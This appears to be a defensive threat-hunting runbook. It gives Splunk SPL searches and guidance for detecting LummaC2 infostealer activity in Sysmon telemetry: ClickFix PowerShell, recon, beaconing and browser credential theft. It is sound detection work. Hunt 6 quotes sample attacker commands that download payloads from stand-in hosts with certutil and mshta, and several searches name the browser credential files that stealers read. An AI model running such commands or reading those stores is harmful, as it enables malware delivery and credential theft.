# Threat Hunting Runbook — LummaC2 / Infostealer Behaviours

Hypothesis-driven threat hunts against `index=sysmon host=cti-win-detonation`.
Aligned to FBI/CISA Advisory AA25-141B and MITRE ATT&CK.

All hunts follow the same structure:
1. **Hypothesis** — what attacker behaviour we expect to see
2. **ATT&CK** — technique being hunted
3. **Hunt SPL** — the search to run
4. **What a hit looks like** — how to distinguish malicious from benign
5. **Next step** — what to do if you find something

---

## Hunting Methodology

This runbook uses a hypothesis-driven approach aligned to the ATT&CK framework:

```
Intelligence → Hypothesis → Hunt → Analyse → Findings → Detections
     ↑                                                         │
     └─────────────── feedback loop ──────────────────────────┘
```

**Start with a PIR** (Priority Intelligence Requirement): *"Is LummaC2 or a
successor infostealer active on endpoints in our environment?"*

Each hunt below tests one component of that question.

---

## Hunt 1 — Unusual Parent-Child Process Relationships

**Hypothesis:** LummaC2 is delivered via ClickFix — a social engineering lure
that instructs the user to paste a PowerShell command into Run or a browser
console. If initial access is via a browser, the parent of the malicious
PowerShell will be chrome.exe, msedge.exe, or a ClickFix-style mshta/wscript.

**ATT&CK:** T1059.001 (PowerShell), T1566 (Phishing/Social Engineering)

**Hunt SPL:**
```spl
index=sysmon host=cti-win-detonation EventCode=1 earliest=-24h
Image="*\powershell.exe"
| eval suspicious_parent=if(match(ParentImage,"chrome\.exe|msedge\.exe|firefox\.exe|mshta\.exe|wscript\.exe|cscript\.exe|winword\.exe|excel\.exe"),"YES","no")
| where suspicious_parent="YES"
| table _time Computer User Image CommandLine ParentImage ParentCommandLine
| sort - _time
```

**What a hit looks like:**
- `ParentImage = C:\Program Files\Google\Chrome\Application\chrome.exe`
- Child spawning PowerShell directly from a browser is almost never legitimate
- Any `ParentImage` from Office apps (winword, excel) spawning PowerShell is high confidence

**What normal looks like:**
- PowerShell spawned from `explorer.exe`, `services.exe`, `svchost.exe`, or IT tools

**Next step:** If hit — pivot to the full CommandLine, check for encoded content,
look for subsequent EventCode=3 (network connection) from the same process within
5 minutes.

---

## Hunt 2 — Discovery Tool Cluster (Recon Phase)

**Hypothesis:** Post-compromise, LummaC2 runs several discovery commands in rapid
succession — systeminfo, whoami, ipconfig, hostname. No legitimate user or
scheduled task runs all of these within 2 minutes from the same parent process.

**ATT&CK:** T1082 (System Info), T1016 (Network Config), T1033 (System Owner)

**Hunt SPL:**
```spl
index=sysmon host=cti-win-detonation EventCode=1 earliest=-24h
(Image="*\systeminfo.exe" OR Image="*\whoami.exe" OR Image="*\ipconfig.exe"
 OR Image="*\hostname.exe" OR Image="*\net.exe" OR Image="*\nltest.exe")
| bin _time span=2m
| stats dc(Image) AS tool_count, values(Image) AS tools, values(CommandLine) AS commands by _time Computer User ParentImage
| where tool_count >= 3
| sort - _time
```

**What a hit looks like:**
- 3+ distinct discovery tools run from the same parent within a 2-minute window
- `tool_count >= 3` from a non-admin parent is high confidence recon

**What normal looks like:**
- IT management tools (SCCM, Ansible, monitoring agents) may run discovery commands
  but will have consistent `ParentImage` paths like `C:\Windows\CCM\` or known agent paths
- Scheduled tasks — check `ParentImage = TaskEng.exe` and cross-reference against
  known scheduled task inventory

**Next step:** If hit — identify the ParentImage. If it's unexpected (cmd.exe,
powershell.exe with no clear admin context), treat as compromised host.
Look for EventCode=11 file writes within the next 10 minutes from the same host.

---

## Hunt 3 — Encoded PowerShell (ClickFix Dropper Pattern)

**Hypothesis:** LummaC2 ClickFix campaigns instruct victims to run a PowerShell
command that decodes and executes a Base64 payload. The key indicator is Base64
content in the CommandLine — either `-EncodedCommand`, `-enc`, `FromBase64String`,
or a long Base64 string embedded in a `-Command` argument.

**ATT&CK:** T1027 (Obfuscated Files), T1140 (Deobfuscate/Decode)

**Hunt SPL:**
```spl
index=sysmon host=cti-win-detonation EventCode=1 earliest=-24h
Image="*\powershell.exe"
| eval b64_length=len(replace(CommandLine,"[^A-Za-z0-9+/=]",""))
| eval enc_indicator=if(
    match(CommandLine,"-EncodedCommand|-enc |-e ") OR
    match(CommandLine,"FromBase64String|ToBase64String") OR
    match(CommandLine,"IEX|Invoke-Expression"),
    "YES","no")
| where enc_indicator="YES"
| table _time Computer User CommandLine ParentImage b64_length
| sort - _time
```

**Pivot — extract and decode the payload:**
```spl
index=sysmon host=cti-win-detonation EventCode=1 earliest=-24h
Image="*\powershell.exe"
match(CommandLine,"-EncodedCommand|-enc ")
| rex field=CommandLine "(?:-EncodedCommand|-enc )\s+(?P<b64_payload>[A-Za-z0-9+/=]{20,})"
| eval decoded=replace(b64_payload,"[^A-Za-z0-9+/=]","")
| table _time Computer CommandLine b64_payload decoded
```

**What a hit looks like:**
- CommandLine contains a long string of Base64 characters after `-enc` or `-EncodedCommand`
- `IEX` and `FromBase64String` in the same CommandLine is high confidence ClickFix

**What normal looks like:**
- IT automation scripts (DSC, remote management) use `-EncodedCommand` legitimately
  but will have consistent, known parent processes and predictable timing (scheduled)
- Cross-reference against your known-good baseline — what parent processes are expected
  to run encoded PowerShell?

**Next step:** If hit — pivot to EventCode=3 (network connection) from powershell.exe
within 2 minutes of execution. That's the C2 callback after the dropper runs.

---

## Hunt 4 — Suspicious Network Connections Post-Execution

**Hypothesis:** After LummaC2 executes, it establishes a C2 connection. The
indicator is a network connection (EventCode=3) from an unusual process —
particularly non-browser processes connecting to external IPs on port 80/443,
or any process connecting to non-standard ports.

**ATT&CK:** T1071.001 (Web Protocols C2), T1105 (Ingress Tool Transfer)

**Hunt SPL:**
```spl
index=sysmon host=cti-win-detonation EventCode=3 earliest=-24h
NOT (Image="*\chrome.exe" OR Image="*\msedge.exe" OR Image="*\firefox.exe"
     OR Image="*\svchost.exe" OR Image="*\MsMpEng.exe" OR Image="*\OneDrive.exe"
     OR DestinationIp="10.*" OR DestinationIp="192.168.*" OR DestinationIp="127.*")
| stats count AS connection_count, values(DestinationIp) AS dest_ips,
        values(DestinationPort) AS dest_ports, values(DestinationHostname) AS hostnames
  by Computer Image User
| where connection_count >= 1
| sort - connection_count
```

**Hunt for beaconing — regular interval connections (C2 heartbeat):**
```spl
index=sysmon host=cti-win-detonation EventCode=3 earliest=-6h
NOT (Image="*\chrome.exe" OR Image="*\msedge.exe" OR Image="*\svchost.exe")
DestinationIp!="10.*" DestinationIp!="192.168.*"
| bin _time span=5m
| stats count by _time Computer Image DestinationIp
| eventstats avg(count) AS avg_count, stdev(count) AS stdev_count by Computer Image DestinationIp
| where count > 0 AND stdev_count < 2
| stats count AS beacon_intervals by Computer Image DestinationIp avg_count
| where beacon_intervals >= 4
| sort - beacon_intervals
```

**What a hit looks like:**
- `powershell.exe` or `rundll32.exe` making external connections
- Regular interval connections at consistent timing (beaconing) from an unexpected process
- Connections to IPs/domains that don't appear in threat intel feeds

**What normal looks like:**
- Windows Update (`wuauclt.exe`, `svchost.exe` to Microsoft IP ranges)
- Antivirus updates, telemetry from known security tools

**Next step:** If hit — run the destination IP through VirusTotal/ThreatFox enrichment.
Check if it appears in `index=threat_intel` or OpenCTI. Pivot to all EventCode=3
events from that destination IP across all hosts to establish blast radius.

---

## Hunt 5 — Non-Browser Access to Browser Credential Stores

**Hypothesis:** LummaC2 steals browser cookies and saved credentials by directly
reading browser profile directories. The indicator is EventCode=11 (file access/create)
or EventCode=7 (DLL load of browser crypto libraries) from a non-browser process
targeting Chrome/Edge/Firefox profile paths.

**ATT&CK:** T1539 (Web Session Cookie), T1555.003 (Browser Credentials)

**Hunt SPL — file access to credential paths:**
```spl
index=sysmon host=cti-win-detonation EventCode=11 earliest=-24h
(TargetFilename="*\Chrome\User Data\*" OR TargetFilename="*\Edge\User Data\*"
 OR TargetFilename="*\Firefox\Profiles\*" OR TargetFilename="*\Cookies*"
 OR TargetFilename="*\Login Data*" OR TargetFilename="*\Web Data*")
NOT (Image="*\chrome.exe" OR Image="*\msedge.exe" OR Image="*\firefox.exe"
     OR Image="*\MicrosoftEdgeUpdate.exe" OR Image="*\GoogleUpdate.exe")
| table _time Computer User Image TargetFilename
| sort - _time
```

**Hunt SPL — suspicious DLL loads (browser crypto access):**
```spl
index=sysmon host=cti-win-detonation EventCode=7 earliest=-24h
(ImageLoaded="*\Chrome\*" OR ImageLoaded="*\crypt32.dll" OR ImageLoaded="*\dpapi.dll")
NOT (Image="*\chrome.exe" OR Image="*\msedge.exe" OR Image="*\MsMpEng.exe")
| table _time Computer Image ImageLoaded
| sort - _time
```

**What a hit looks like:**
- Any non-browser executable touching `Login Data`, `Cookies`, or `Web Data` files
- DPAPI library (`dpapi.dll`) loaded by an unexpected process — used to decrypt
  browser-stored credentials

**What normal looks like:**
- Browser processes themselves accessing their own profile
- Password managers with explicit browser integration (1Password, Bitwarden)
  — check against approved software inventory

**Next step:** If hit — immediately check for EventCode=3 (network connection)
from the same process within 10 minutes — credential exfiltration follows access.
Isolate the host. Assume all stored browser credentials are compromised.

---

## Hunt 6 — LOLBin Execution from Unusual Paths (Living off the Land)

**Hypothesis:** LummaC2 uses legitimate Windows binaries (LOLBins) like rundll32,
mshta, regsvr32, and certutil from writable user paths — avoiding writing new
executables to disk. The indicator is a known LOLBin executing from or with
arguments pointing to `AppData`, `Users\Public`, `Temp`, or `Downloads`.

**ATT&CK:** T1106 (Native API), T1218 (Signed Binary Proxy Execution)

**Hunt SPL:**
```spl
index=sysmon host=cti-win-detonation EventCode=1 earliest=-24h
(Image="*\rundll32.exe" OR Image="*\regsvr32.exe" OR Image="*\mshta.exe"
 OR Image="*\certutil.exe" OR Image="*\wscript.exe" OR Image="*\cscript.exe"
 OR Image="*\msiexec.exe")
(CommandLine="*\AppData\*" OR CommandLine="*\Users\Public\*"
 OR CommandLine="*\Temp\*" OR CommandLine="*\Downloads\*"
 OR CommandLine="*http*" OR CommandLine="*ftp*")
| table _time Computer User Image CommandLine ParentImage
| sort - _time
```

**What a hit looks like:**
- `rundll32.exe C:\Users\Public\update.dll,Entry` — executing a DLL from a user-writable path
- `certutil.exe -decode http://evil.com/payload.b64 output.exe` — LOLBin for download
- `mshta.exe http://malicious.site/payload.hta` — HTML Application execution

**What normal looks like:**
- Legitimate software installers use msiexec, regsvr32 with paths under `C:\Program Files`
- IT scripts may use certutil for certificate operations — check for `-decode` flag
  specifically as that indicates payload decoding

**Next step:** If hit — check Sysmon EventCode=1 for the spawned child processes.
LOLBins are often used as one-step in a chain — the real payload executes next.
Timeline all events from the same `ProcessId` within 5 minutes.

---

## Running a Complete Hunt Session

A practical 30-minute hunt session against your live data:

```
1. Set time range to last 24 hours
2. Run Hunt 2 (discovery cluster) — establishes if any recon occurred
3. If hits: Run Hunt 1 (parent-child) to find the initial execution
4. Run Hunt 3 (encoded PowerShell) in parallel — independent dropper check
5. If any hits from 1-3: Run Hunt 4 (network connections) to find C2
6. Run Hunt 5 (browser credential access) — check for data theft
7. Document findings: host, timeframe, TTPs observed, confidence level
8. Convert any confirmed findings into new detection rules
```

---

## Converting Hunt Findings into Alerts

When a hunt finds something, the output should always be a new or tuned detection:

1. **Confirm the signal** — run the hunt SPL over 7 days, check the false positive rate
2. **Add exclusions** — NOT clauses for known-good processes, paths, scheduled tasks
3. **Save as alert** — see `docs/splunk_alert_creation.md` for the full process
4. **Set appropriate schedule** — high-confidence TTPs: hourly; noisy searches: every 6h with higher threshold
5. **Document the hypothesis** — add a comment line to the SPL explaining what the search detects and why

This feedback loop — hunt → finding → detection rule → alert — is how a detection
library grows from intelligence rather than vendor signatures.

---

## Interview Talking Points

- "I start every hunt with a hypothesis rooted in threat intelligence — what is
  this actor likely to do, and what would that look like in the telemetry?"
- "The LummaC2 advisory tells me they use ClickFix for initial access. That means
  I'm hunting for PowerShell spawned from browser processes — that's my first search."
- "A detection rule is the output of a successful hunt. If I find something manually,
  the next step is always: can I automate the detection of this pattern?"
- "I use parent-child process relationships a lot — they're harder for attackers to
  fake than individual process names, and they reveal the execution chain."
- "Beaconing detection — looking for regular interval connections from unexpected
  processes — is one of the most reliable ways to find established C2 that's
  evaded signature detection."
